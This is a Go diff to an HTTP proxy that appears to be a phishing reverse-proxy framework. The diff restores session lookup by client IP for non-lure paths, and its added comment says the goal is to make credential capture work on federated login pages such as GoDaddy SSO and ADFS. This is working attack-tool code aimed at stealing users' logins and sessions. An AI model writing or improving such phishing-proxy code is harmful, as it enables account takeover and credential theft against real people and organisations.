@@ -341,20 +341,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					} else {
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
-							// not a lure path and IP is whitelisted
-
-							// TODO: allow only retrieval of static content, without setting session ID
-
-							create_session = false
-							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
+							// not a lure path but IP is whitelisted — recover session by IP
+							// so credential capture works on federated login pages (GoDaddy SSO, ADFS, etc.)
+							ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
+							if ok {
+								create_session = false
+								ps.Index, ok = p.sids[ps.SessionId]
+								if !ok {
+									ps.Index = 0
+								}
+							} else {
+								create_session = false
+								req_ok = true
+							}
 						}
 					}
 
